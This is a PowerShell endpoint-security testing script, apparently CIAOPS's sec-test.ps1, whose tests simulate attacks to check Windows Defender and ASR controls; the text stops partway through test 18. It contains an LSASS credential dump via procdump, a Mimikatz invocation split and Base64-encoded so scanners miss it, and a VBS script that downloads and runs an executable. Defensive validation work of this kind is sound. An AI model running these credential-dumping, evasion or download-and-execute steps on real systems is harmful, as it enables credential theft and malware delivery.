<#
.SYNOPSIS
    Security Testing Script - Validates endpoint protection and security controls

.DESCRIPTION
    This script performs comprehensive security testing to validate that endpoint protection,
    Microsoft Defender, attack surface reduction (ASR) rules, and other security controls are
    properly configured and functioning in your environment.
    
    The script includes 60 different security tests covering:
    - Antivirus detection (EICAR test files)
    - Memory-based malware detection (AMSI)
    - Credential dumping protection (LSASS)
    - Office macro protection
    - Attack Surface Reduction (ASR) rules
    - Browser-based threats
    - Script execution controls
    - Known vulnerability exploitation attempts
    
    IMPORTANT: This script intentionally performs malicious-like activities to test security
    controls. It should ONLY be run in controlled test environments with proper authorization.
    The script is designed for security professionals and IT administrators.

.PARAMETER Debug
    Enables debug mode with transcript logging. Creates a log file (sec-test.txt) in the
    parent directory containing all script output for review and troubleshooting.

.PARAMETER NoPrompt
    Runs all 60 tests automatically without user interaction. Without this parameter,
    a GUI menu allows selection of specific tests to run.

.EXAMPLE
    .\sec-test.ps1
    Launches interactive mode with a GUI menu to select specific tests

.EXAMPLE
    .\sec-test.ps1 -Debug
    Runs in interactive mode and creates a transcript log file

.EXAMPLE
    .\sec-test.ps1 -NoPrompt -Debug
    Runs all tests automatically and logs all output

.NOTES
    Author: CIAOPS
    Source: https://github.com/directorcia/Office365/blob/master/sec-test.ps1
    Documentation: https://blog.ciaops.com/2021/06/29/is-security-working-powershell-script/
    Video: https://www.youtube.com/watch?v=Cq0tj6kfSBo
    Resources: https://demo.wd.microsoft.com/
    
    Prerequisites:
    - Windows 10/11 with Microsoft Defender
    - Microsoft Office (for Office-related tests)
    - Valid Microsoft 365 account (for authentication tests)
    - Administrative privileges (for some tests)
    - Internet connectivity (for downloads)
    
    WARNING: This script is provided as-is with no guarantees or warranty.
    Use at your own risk. Only run in authorized test environments.
    
    The script may be flagged by antivirus software. Consider adding the script
    location to Defender exclusions before running.

.LINK
    https://blog.ciaops.com/2021/06/29/is-security-working-powershell-script/
#>

[CmdletBinding()]
param(                        
    [Parameter(HelpMessage = "Enable debug mode with transcript logging")]
    [switch]$Debug,
    
    [Parameter(HelpMessage = "Run without user prompts")]
    [switch]$NoPrompt
)

#Region Variables
# Define color scheme for consistent output messaging throughout the script
# These colors help users quickly identify the type of message being displayed
$systemmessagecolor = "cyan"        # System messages (script start/stop)
$processmessagecolor = "green"      # Process messages (normal operations, successful tests)
$errormessagecolor = "red"          # Error messages (failed tests, security gaps)
$warningmessagecolor = "yellow"     # Warning messages (informational, cautions)
#EndRegion Variables

<#
.SYNOPSIS
    Generates the interactive menu of available security tests
    
.DESCRIPTION
    Creates an array of test objects that will be displayed to the user for selection.
    Each test validates a specific security control or protection mechanism.
    
.PARAMETER mitems
    Array to populate with test menu items
    
.OUTPUTS
    Array of PSCustomObjects containing test numbers and descriptions
#>
function displaymenu($mitems) {
    # Test 1: Antivirus download protection - validates AV blocks malicious file downloads
    $mitems += [PSCustomObject]@{
        Number = 1;
        Test = "Download EICAR file"
    }
    $mitems += [PSCustomObject]@{
        Number = 2;
        Test = "Create EICAR file in current directory"
    }
    $mitems += [PSCustomObject]@{
        Number = 3;
        Test = "Create malware in memory"
    }
    $mitems += [PSCustomObject]@{
        Number = 4;
        Test = "Attempt LSASS process dump"
    }
    $mitems += [PSCustomObject]@{
        Number = 5;
        Test = "Mimikatz test"
    }
    $mitems += [PSCustomObject]@{
        Number = 6;
        Test = "Generate failed Microsoft 365 login"
    }
    $mitems += [PSCustomObject]@{
        Number = 7;
        Test = "Office applications creating child processes"
    }
    $mitems += [PSCustomObject]@{
        Number = 8;
        Test = "Office applications creating executables"
    }
    $mitems += [PSCustomObject]@{
        Number = 9;
        Test = "Impede Javascript and VBScript launch executables"
    }
    $mitems += [PSCustomObject]@{
        Number = 10;
        Test = "Block Win32 imports from Macro code in Office"
    }
    $mitems += [PSCustomObject]@{
        Number = 11;
        Test = "Block Process Creations originating from PSExec & WMI commands"
    }
    $mitems += [PSCustomObject]@{
        Number = 12;
        Test = "Block VBS script to download then execute"
    }
    $mitems += [PSCustomObject]@{
        Number = 13;
        Test = "Network protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 14;
        Test = "Suspicious web page (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 15;
        Test = "Phishing web page (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 16;
        Test = "Block download on reputation (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 17;
        Test = "Browser exploit protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 18;
        Test = "Mailcious browser frame protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 19;
        Test = "Unknown program protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 20;
        Test = "Known malicious program protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 21;
        Test = "Potentially unwanted application protection (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 22;
        Test = "Block at first seen (web browser)"
    }
    $mitems += [PSCustomObject]@{
        Number = 23;
        Test = "Check Windows Defender Services"
    }
    $mitems += [PSCustomObject]@{
        Number = 24;
        Test = "Check Windows Defender Configuration"
    }
    $mitems += [PSCustomObject]@{
        Number = 25;
        Test = "Check MSHTA script launch"
    }
    $mitems += [PSCustomObject]@{
        Number = 26;
        Test = "Squiblydoo attack"
    }
    $mitems += [PSCustomObject]@{
        Number = 27;
        Test = "Block Certutil download"
    }
    $mitems += [PSCustomObject]@{
        Number = 28;
        Test = "Block WMIC process launch"
    }
    $mitems += [PSCustomObject]@{
        Number = 29;
        Test = "Block RUNDLL32 process launch"
    }
    $mitems += [PSCustomObject]@{
        Number = 30;
        Test = "PrintNightmare/Mimispool"
    }
    $mitems += [PSCustomObject]@{
        Number = 31;
        Test = "HiveNightmare/CVE-2021-36934"
    }
    $mitems += [PSCustomObject]@{
        Number = 32;
        Test = "MSHTML/CVE-2021-40444"
    }
    $mitems += [PSCustomObject]@{
        Number = 33;
        Test = "Forms 2.0 HTML controls"
    }
    $mitems += [PSCustomObject]@{
        Number = 34;
        Test = "Word document Backdoor drop"
    }
    $mitems += [PSCustomObject]@{
        Number = 35;
        Test = "PowerShell script in fileless attack"
    }
    $mitems += [PSCustomObject]@{
        Number = 36;
        Test = "Dump credentials using SQLDumper.exe"
    }
    $mitems += [PSCustomObject]@{
        Number = 37;
        Test = "Dump credentials using COMSVCS"
    }
    $mitems += [PSCustomObject]@{
        Number = 38;
        Test = "Mask Powershell.exe as Notepad.exe"
    }
    $mitems += [PSCustomObject]@{
        Number = 39;
        Test = "Create scheduled tasks"
    }
    $mitems += [PSCustomObject]@{
        Number = 40;
        Test = "PowerShell Constrained Language Mode"
    }
    $mitems += [PSCustomObject]@{
        Number = 41;
        Test = "PowerShell Logging Configuration"
    }
    $mitems += [PSCustomObject]@{
        Number = 42;
        Test = "Attack Surface Reduction (ASR) Rules Status"
    }
    $mitems += [PSCustomObject]@{
        Number = 43;
        Test = "Controlled Folder Access (Ransomware Protection)"
    }
    $mitems += [PSCustomObject]@{
        Number = 44;
        Test = "Credential Guard Status"
    }
    $mitems += [PSCustomObject]@{
        Number = 45;
        Test = "Secure Boot Status"
    }
    $mitems += [PSCustomObject]@{
        Number = 46;
        Test = "BitLocker Encryption Status"
    }
    $mitems += [PSCustomObject]@{
        Number = 47;
        Test = "TPM (Trusted Platform Module) Status"
    }
    $mitems += [PSCustomObject]@{
        Number = 48;
        Test = "Windows Firewall Status"
    }
    $mitems += [PSCustomObject]@{
        Number = 49;
        Test = "User Account Control (UAC) Level"
    }
    $mitems += [PSCustomObject]@{
        Number = 50;
        Test = "SMB Signing Configuration"
    }
    $mitems += [PSCustomObject]@{
        Number = 51;
        Test = "Local Administrator Accounts"
    }
    $mitems += [PSCustomObject]@{
        Number = 52;
        Test = "RDP Security Configuration"
    }
    $mitems += [PSCustomObject]@{
        Number = 53;
        Test = "Windows Defender Application Guard Status"
    }
    $mitems += [PSCustomObject]@{
        Number = 54;
        Test = "Virtualization-Based Security (VBS)"
    }
    $mitems += [PSCustomObject]@{
        Number = 55;
        Test = "Windows Update Compliance"
    }
    $mitems += [PSCustomObject]@{
        Number = 56;
        Test = "AppLocker/Application Control Policies"
    }
    $mitems += [PSCustomObject]@{
        Number = 57;
        Test = "Windows Sandbox Availability"
    }
    $mitems += [PSCustomObject]@{
        Number = 58;
        Test = "DNS over HTTPS (DoH) Configuration"
    }
    $mitems += [PSCustomObject]@{
        Number = 59;
        Test = "Windows Security Center Status"
    }
    $mitems += [PSCustomObject]@{
        Number = 60;
        Test = "Code Integrity Policies"
    }

    return $mitems
}

<#
.SYNOPSIS
    Test 1: Download EICAR file to validate antivirus download protection
    
.DESCRIPTION
    Attempts to download the EICAR test file (a safe file used to test antivirus software).
    A properly configured antivirus should block or quarantine this download.
    
    EXPECTED RESULT: Download should be blocked or file should be quarantined
    FAILED TEST: File downloads successfully and can be read
#>
function downloadfile() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 1. Download EICAR file ---"
    $dldetect = $true  # Assume detection will occur
    Write-Host -ForegroundColor $processmessagecolor "Download eicar.com.txt file to current directory"
    if (Test-Path -Path .\eicar.com.txt -PathType Leaf) {
        Write-Host -ForegroundColor $processmessagecolor "Detected existing eicar.com.txt file in current directory."
        Remove-Item .\eicar1.com.txt
        Write-Host -ForegroundColor $processmessagecolor "Deleted previous eicar.com.txt version in current directory."
    }
    Invoke-WebRequest -Uri https://secure.eicar.org/eicar.com.txt -OutFile .\eicar.com.txt
    Write-Host -ForegroundColor $processmessagecolor "Verify eicar.com.txt file in current directory"
    try {
        Get-Content .\eicar.com.txt
    }
    catch {
        Write-Host -ForegroundColor $processmessagecolor "eicar.com.txt file download not found - test SUCCEEDED"
        $dldetect = $false
    }
    if ($dldetect) {
        Write-Host -ForegroundColor $warningmessagecolor "eicar.com.txt file download found - test FAILED"
        $dlexist = $true
        try {
            $dlsize = (Get-ChildItem ".\eicar.com.txt").Length
        }
        catch {
            $dlexist = $false
            Write-Host -ForegroundColor $processmessagecolor "eicar.com.txt download not found - test SUCCEEDED"
        }
        if ($dlexist) {
            if ($dlsize -ne 0) {
                Write-Host -ForegroundColor $errormessagecolor "eicar.com.txt download file length > 0 - test FAILED"
            }
        }
    }
}
<#
.SYNOPSIS
    Test 2: Create EICAR file using alternate data streams
    
.DESCRIPTION
    Creates an EICAR test file using NTFS alternate data streams (ADS), a technique
    sometimes used by malware to hide files. This tests if antivirus can detect
    malicious content written directly to disk using ADS.
    
    EXPECTED RESULT: File creation should be blocked, or file should be 0 bytes
    FAILED TEST: File created with non-zero size
#>
function createfile() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 2. Create EICAR file in current directory ---"
    # Use alternate data stream (ADS) to write EICAR string - tests AV detection of ADS usage
    Set-Content .\eicar1.com.txt:EICAR "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    Write-Host -ForegroundColor $processmessagecolor "Attempt eicar1.com.txt file creation from memory"   
    $crdetect = $false
    Write-Host -ForegroundColor $processmessagecolor "Check Windows Defender logs for eicar1 report"
    $results = Get-MpThreatDetection | Sort-Object InitialDetectionTime -Descending
    $item = 0
    foreach ($result in $results) {
        if ($result.actionsuccess -and ($result.resources -match "eicar1")) {
            ++$item
            Write-Host "`nItem =" $item
            Write-Host "Initial detection time =" $result.initialdetectiontime
            Write-Host "Process name =" $result.processname
            Write-Host -ForegroundColor $processmessagecolor "Resource = " $result.resources
            $crdetect = $true
        }
    }
    if ($crdetect) {
        Write-Host -ForegroundColor $processmessagecolor "`nEICAR file creation detected - test SUCCEEDED"
    }
    else {
        Write-Host -ForegroundColor $errormessagecolor "`nEICAR file creation not detected - test FAILED"
    }
    $crdetect = $true
    try {
        $fileproperty = Get-ItemProperty .\eicar1.com.txt
    }
    catch {
        Write-Host -ForegroundColor $processmessagecolor "eicar1.com.txt file not detected - test SUCCEEDED"
        $crdetect = $false
    }
    if ($crdetect) {
        if ($fileproperty.Length -eq 0) {
            Write-Host -ForegroundColor $processmessagecolor "eicar1.com.txt detected with file size = 0 - test SUCCEEDED"
            Write-Host -ForegroundColor $processmessagecolor "Removing file .\EICAR1.COM.TXT"
            Remove-Item .\eicar1.com.txt
        }
        else {
            Write-Host -ForegroundColor $errormessagecolor "eicar1.com.txt detected but file size is not 0 - test FAILED"
        }
    }
}

<#
.SYNOPSIS
    Test 3: In-memory malware detection via AMSI
    
.DESCRIPTION
    Tests the Anti-Malware Scan Interface (AMSI), which scans scripts and code
    running in memory. This test creates a malicious string in memory without
    touching the disk, simulating fileless malware attacks.
    
    The test splits and encodes the AMSI test signature to avoid triggering
    detection in this script itself, then passes it to a child PowerShell process.
    
    EXPECTED RESULT: AMSI blocks the malicious content, error file cannot be read
    FAILED TEST: Child process executes successfully
#>
function inmemorytest() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 3. In memory test ---"
    $memdetect = $false
    $errorfile = ".\sec-test-$(Get-Date -f yyyyMMddHHmmss).txt"     # Unique timestamped output file
    
    # Split AMSI test signature into parts to avoid detection in this script
    $s1 = "AMSI Test Sample: 7e72c3ce"             # First half of AMSI test signature
    $s2 = "-861b-4339-8740-0ac1484c1386"           # Second half of AMSI test signature
    $s3 = ($s1 + $s2)                              # Combine at runtime
    
    # Base64 encode the command to further obfuscate during script execution
    $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s3))
    Write-Host -ForegroundColor $processmessagecolor "Launch Powershell child process to output EICAR string to console"
    Start-Process powershell -ArgumentList "-EncodedCommand $encodedcommand" -Wait -WindowStyle Hidden -RedirectStandardError $errorfile
    Write-Host -ForegroundColor $processmessagecolor "Attempt to read output file created by child process"
    try {
        $result = Get-Content $errorfile -ErrorAction Stop        # look at child process error output
    }
    catch {     # if unable to open file this is because EICAR string found in there
        Write-Host -ForegroundColor $processmessagecolor "In memory malware creation blocked - test SUCCEEDED"
        Write-Host -ForegroundColor $processmessagecolor "Removing file $errorfile"
        Remove-Item $errorfile      # remove child process error output file
        $memdetect = $true          # set detection state = found
    }
    if (-not $memdetect) {
        Write-Host -ForegroundColor $errormessagecolor "In memory test malware creation not blocked - test FAILED"
        Write-Host -ForegroundColor $errormessagecolor "Recommended action = review file $errorfile"
    }
}

<#
.SYNOPSIS
    Test 4: LSASS process dump protection
    
.DESCRIPTION
    Attempts to dump the Local Security Authority Subsystem Service (LSASS) process,
    which contains sensitive credentials in memory. This is a common technique used
    by attackers to steal credentials (e.g., Mimikatz).
    
    Uses SysInternals ProcDump to attempt the dump in both user and admin contexts.
    Modern security features like Credential Guard and LSA Protection should prevent this.
    
    EXPECTED RESULT: Access denied, no dump file created
    FAILED TEST: Dump file successfully created
#>
function processdump() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 4. Attempt LSASS process dump ---"
    $result = Test-Path ".\procdump.exe"
    $procdump = $true
    if (-not $result) {
        Write-Host -ForegroundColor $warningmessagecolor "SysInternals procdump.exe not found in current directory"
        if (-not $noprompt) {        # if running the script WITH prompting
            do {
                $result = Read-Host -Prompt "Download SysInternals procdump (Y/N)?"
            } until (-not [string]::isnullorempty($result))
        }
        else {
            $result = 'Y'
        }
        if ($result -eq 'Y' -or $result -eq 'y') {
            write-host -foregroundcolor $processmessagecolor "Download procdump.zip to current directory"
            invoke-webrequest -uri https://download.sysinternals.com/files/Procdump.zip -outfile .\procdump.zip
            write-host -foregroundcolor $processmessagecolor "Expand procdump.zip file to current directory"
            Expand-Archive -LiteralPath .\procdump.zip -DestinationPath .\ -Force
            $result = test-path ".\procdump.exe"
            if ($result) {
                write-host -foregroundcolor $processmessagecolor "procdump.exe found in current directory"
            }
            else {
                write-host -foregroundcolor $errormessagecolor "procdump.exe not found in current directory"
                $procdump = $false
            }
        }
        else {
            $procdump = $false
        }
    }
    if ($procdump) {
        $accessdump = $true
        try {
            write-host -nonewline -foregroundcolor $processmessagecolor "Attempt process dump in current user context = "
            $result = .\procdump.exe -mm lsass.exe lsass.dmp -accepteula    
        }
        catch {
            if ($error[0] -match "Access is denied") {
                write-host -foregroundcolor $processmessagecolor "Access denied - Unable to process dump in current user context - test SUCCEEDED"
                $accessdump = $false
            }
            else {
                write-host -foregroundcolor $processmessagecolor $error[0]
            }
        }
        if ($result -match "Access is denied") {
            write-host -foregroundcolor $processmessagecolor "Access denied - Unable to process dump in current user context - test SUCCEEDED"
            $accessdump = $false
        }
        else {
            $result = test-path ".\lsass.dmp"
            if ($result) {
                write-host -foregroundcolor $errormessagecolor "Dump file found - test FAILED"
                $accessdump = $true
                write-host -foregroundcolor $processmessagecolor "Removing dump file .\LSASS.DMP"
                Remove-Item ".\lsass.dmp"
            }
        }
        try {
            write-host -nonewline -foregroundcolor $processmessagecolor "Attempt process dump in admin context = "
            $error.Clear()      # Clear any existing errors
            start-process -filepath ".\procdump.exe" -argumentlist "-mm -o lsass.exe lsass.dmp" -verb runas -wait -WindowStyle Hidden
        }
        catch {
            if ($error[0] -match "Access is denied") {
                write-host -foregroundcolor $processmessagecolor "Access denied - Unable to process dump in admin context - test SUCCEEDED"
                $accessdump = $false
            }
        }
        $result = test-path ".\lsass.dmp"
        if ($result) {
            write-host -foregroundcolor $errormessagecolor "Dump file found - test FAILED"
            $accessdump = $true
            write-host -foregroundcolor $processmessagecolor "Removing dump file .\LSASS.DMP"
            Remove-Item ".\lsass.dmp"
        }
        if ($accessdump) {
            write-host -foregroundcolor $errormessagecolor "Able to process dump or other error - test FAILED"
        }
    }
}

function mimikatztest() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 5. Mimikatz test ---"
    $errorfile = ".\sec-test-$(get-date -f yyyyMMddHHmmss).txt"     # unique output file
    $s1 = "invoke-"             # first half of command
    $s2 = "mimikatz"           # second half of command
    $s3=($s1+$s2)                                  # combined EICAR string in one variable
    $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s3)) # need to encode command so not detected and block in this script
    write-host -foregroundcolor $processmessagecolor "Launch Powershell child process to output Mimikatz command string to console"
    Start-Process powershell -ArgumentList "-EncodedCommand $encodedcommand" -wait -WindowStyle Hidden -redirectstandarderror $errorfile
    write-host -foregroundcolor $processmessagecolor "Attempt to read output file created by child process"
    try {
        $result = get-content $errorfile -ErrorAction Stop        # look at child process error output
    }
    catch {     # if unable to open file this is because EICAR strng found in there
        write-host -foregroundcolor $errormessagecolor "[ERROR] Output file not found"
    }
    if ($result -match "This script contains malicious content and has been blocked by your antivirus software") {
        write-host -ForegroundColor $processmessagecolor "Malicious content and has been blocked by your antivirus software - test SUCCEEDED"
        remove-item $errorfile      # remove child process error output file
    }
    else {
        write-host -foregroundcolor $errormessagecolor "Malicious content NOT DETECTED = review file $errorfile - test FAILED"
    }   
}

function failedlogin() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 6. Generate Microsoft 365 failed login ---"
    do {
        $username = Read-host -prompt "Enter valid Microsoft 365 email address to generate failed login"
    } until (-not [string]::isnullorempty($username))
    $password="1"
    $URL = "https://login.microsoft.com"
    $BodyParams = @{"resource" = "https://graph.windows.net"; "client_id" = "1b730954-1685-4b74-9bfd-dac224a7b894" ; "client_info" = "1" ; "grant_type" = "password" ; "username" = $username ; "password" = $password ; "scope" = "openid"}
    $PostHeaders = @{"Accept" = "application/json"; "Content-Type" =  "application/x-www-form-urlencoded"}
    try {
        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr
    } 
    catch {
        switch -wildcard ($RespErr)
        {
            "*AADSTS50126*" {write-host -foregroundcolor $processmessagecolor "Error validating credentials due to invalid username or password as expected - check your logs"; break}
            "*AADSTS50034*" {write-host -foregroundcolor $warningmessagecolor "User $username doesnt exist"; break}
            "*AADSTS50053*" {write-host -foregroundcolor $warningmessagecolor "User $username appears to be locked"; break}
            "*AADSTS50057*" {write-host -foregroundcolor $warningmessagecolor "User $username appears to be disabled"; break}
            default {write-host -foregroundcolor $warningmessagecolor "Unknown error for user $username"}
        }
    }
}

function officechildprocess() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 7. Office applications creating child processes ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
    Invoke-WebRequest -Uri https://demo.wd.microsoft.com/Content/TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm -OutFile .\TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm
    write-host -foregroundcolor $processmessagecolor "Open document using Word"
    Start-Process winword.exe -ArgumentList ".\TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm"
    write-host "`n1. Ensure that a Run Time Error is displayed."
    write-host "2. Please close Word once complete.`n"
    write-host -foregroundcolor $warningmessagecolor "If Command Prompt opens, then the test has FAILED`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete .\TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm"
    remove-item .\TestFile_OfficeChildProcess_D4F940AB-401B-4EFC-AADC-AD5F3C50688A.docm  
}

function officecreateexecutable() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 8. Office applications creating executables ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
    Invoke-WebRequest -Uri https://demo.wd.microsoft.com/Content/TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm -OutFile .\TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm
    write-host -foregroundcolor $processmessagecolor "Open document using Word"
    Start-Process winword.exe -ArgumentList ".\TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm"
    write-host "`n1. Ensure that no executable runs."
    write-host "2. A macro error/warning should be displayed"
    write-host "3. Please close Word once complete.`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm"
    remove-item .\TestFile_Block_Office_applications_from_creating_executable_content_3B576869-A4EC-4529-8536-B80A7769E899.docm  
}

function scriptlaunch() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 9. Impede Javascript and VBScript launch executables ---"
    write-host -foregroundcolor $processmessagecolor "Create DLTEST.JS file in current directory"
    $body = @"
// SCPT:xmlHttpRequest
var xmlHttp = WScript.CreateObject("MSXML2.XMLHTTP");
xmlHttp.open("GET", "https://www.bing.com", false);
xmlHttp.send();

// SCPT:JSRunsFile
var shell = WScript.CreateObject("WScript.Shell");
shell.Run("notepad.exe");
"@
    set-content -Path .\dltest.js $body
    write-host -foregroundcolor $processmessagecolor "Execute DLTEST.JS file in current directory"
    start-process .\dltest.js
    write-host "1. A Windows Script Host error dialog box should have appeared."
    write-host "2. It should read:`n"
    write-host "    Error: This script is blocked by IT policy"
    write-host "    Code: 800A802E`n"
    write-host -foregroundcolor $warningmessagecolor "If NOTEPAD is executed, then the test has FAILED`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete DLTEST.JS"
    remove-item .\dltest.js  

}

function officemacroimport() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 10. Block Win32 imports from Macro code in Office ---"
    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
    Invoke-WebRequest -Uri https://demo.wd.microsoft.com/Content/Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm -OutFile .\Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm
    write-host -foregroundcolor $processmessagecolor "Open document using Word"
    Start-Process winword.exe -ArgumentList ".\Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm"
    write-host "`n1. Ensure that no macros runs and a warning appears." 
    write-host "2. Close Word once complete.`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm"
    remove-item .\Block_Win32_imports_from_Macro_code_in_Office_92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B.docm  
}

function psexecwmicreation() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 11. Block Process Creations originating from PSExec & WMI commands ---"
    write-host -foregroundcolor $processmessagecolor "Create DLTEST.VBS file in current directory"

    $body = @"
on error resume next
set process = GetObject("winmgmts:Win32_Process")
WScript.Echo "Executing notepad"
result = process.Create ("notepad.exe",null,null,processid)
WScript.Echo "Method returned result = " & result
WScript.Echo "Id of new process is " & processid
"@
    set-content -Path .\dltest.vbs $body
    write-host -foregroundcolor $processmessagecolor "Execute DLTEST.VBS file in current directory"
    start-process .\dltest.vbs
    write-host "`n1. NOTEPAD should NOT run."
    write-host "2. A dialog should appear that says - Executing notepad"
    write-host "3. After you press OK button, dialog should say - Method returned result = 2"
    write-host "4. After you press OK button again, should say - Id of new process is"
    write-host "5. There should be NO number displayed in this dialog box"
    write-host "6. Press OK button to end test`n"
    write-host -foregroundcolor $warningmessagecolor "If NOTEPAD executed and/or there is a Process Id number displayed, the test has FAILED`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete DLTEST.VBS"
    remove-item .\dltest.vbs  
}

function scriptdlexecute() {
    
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 12. Block VBS script to download then execute ---"
    write-host -foregroundcolor $processmessagecolor "Create DLTEST2.VBS file in current directory"

    $body = @"
Dim objShell
Dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe", False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile "c:\temp\putty.exe", 2
end with
Set objShell = WScript.CreateObject( "WScript.Shell" )
objShell.Exec("c:\temp\putty.exe")
"@

    set-content -Path .\dltest2.vbs $body
    write-host -foregroundcolor $processmessagecolor "Execute DLTEST2.VBS file in current directory"
    start-process .\dltest2.vbs
    write-host "`n1. PUTTY.EXE should NOT run."
    write-host "2. A dialog should appear that says`n"
    write-host "    Error: Write to file failed"
    write-host "    Code: 800A0BBC`n"
    write-host "3. Press OK button to end test`n"
    pause
    write-host -foregroundcolor $processmessagecolor "Delete DLTEST2.VBS"
    remove-item .\DLTEST2.vbs
    write-host -foregroundcolor $processmessagecolor "Check for PUTTY.EXE in current directory"
    $result = test-path ".\putty.exe"
    if ($result) {
        write-host -foregroundcolor $errormessagecolor "PUTTY.EXE found - test FAILED`n"
        write-host -foregroundcolor $processmessagecolor "Delete PUTTY.EXE"
        remove-item .\putty.exe
    }
    else {
        write-host -foregroundcolor $processmessagecolor "PUTTY.EXE not found - test SUCCEEDED`n"
    }     
}

function networkprotection() {
    $npdetect = $false
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 13. Network protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://smartscreentestratings2.net/"
    try {
        $result = Invoke-WebRequest -Uri https://smartscreentestratings2.net/ 
    }
    catch {
        if ($error[0] -match "The remote name could not be resolved") {
            write-host -foregroundcolor $processmessagecolor "The remote name could not be resolved: smartscreentestratings2.net - test SUCCEEDED" 
        }
        else {
            write-host -foregroundcolor $errormessagecolor "Site resolved - test Failed"
        }
        $npdetect=$true
    }
    if (-not $npdetect) {
        write-host -foregroundcolor $errormessagecolor "Navigation permitted - test FAILED"
    }
}

function suspiciouspage() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 14. Suspicious web page (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/other/areyousure.html"
    start-process -filepath https://demo.smartscreen.msft.net/other/areyousure.html 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should indicate security issues with the page`n"
    pause
}

function phishpage() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 15. Phishing web page (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/phishingdemo.html"
    start-process -filepath https://demo.smartscreen.msft.net/phishingdemo.html 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should indicate security issues with the page and be reported as unsafe`n"
    pause
}

function downloadblock() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 16. Block download on reputation (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/download/malwaredemo/freevideo.exe"
    start-process -filepath https://demo.smartscreen.msft.net/download/malwaredemo/freevideo.exe 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should indicate security issues with the page and be reported as unsafe`n"
    write-host -foregroundcolor $warningmessagecolor "You should be UNABLE to download and save a file from browser to local workstation`n"
    pause
}

function exploitblock() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 17. Browser exploit protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/other/exploit.html"
    start-process -filepath https://demo.smartscreen.msft.net/other/exploit.html 
    write-host "`n1. Your default browser should open"
    write-host "2. Your browser should indicate security issues with the page and be reported as unsafe`n"
    pause
}

function maliciousframe() {
    write-host -ForegroundColor white -backgroundcolor blue "`n--- 18. Mailcious browser frame protection (web browser) ---"
    write-host -foregroundcolor $processmessagecolor "Connect to test URL https://demo.smartscreen.msft.net/other/exploit_frame.html"
    start-process -filepath https://demo.smartscreen.msft.net/other/exploit_frame.html 
    write-host "`n1. Your default browser should open"
